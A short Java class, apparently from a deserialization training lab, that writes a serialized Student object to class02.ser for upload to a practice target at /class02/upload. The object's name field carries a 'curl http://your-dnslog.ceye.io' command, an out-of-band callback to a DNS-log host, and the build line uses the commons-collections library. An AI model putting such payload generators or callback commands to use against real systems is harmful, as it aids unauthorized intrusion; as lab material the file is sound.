package class02;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

/**
 * 生成 class02 的 payload — 基础反序列化
 * 目标: 上传 Student 对象，触发 toString() 显示内容
 * 靶场: /class02/upload
 *
 * 编译: javac -cp ../lib/commons-collections-3.2.1.jar Student.java GenPayload.java
 * 运行: java -cp ../lib/commons-collections-3.2.1.jar:. class02.GenPayload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Student student = new Student("curl http://your-dnslog.ceye.io", 18);

        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("class02.ser"));
        oos.writeObject(student);
        oos.close();

        System.out.println("✅ 已生成: class02.ser");
    }
}
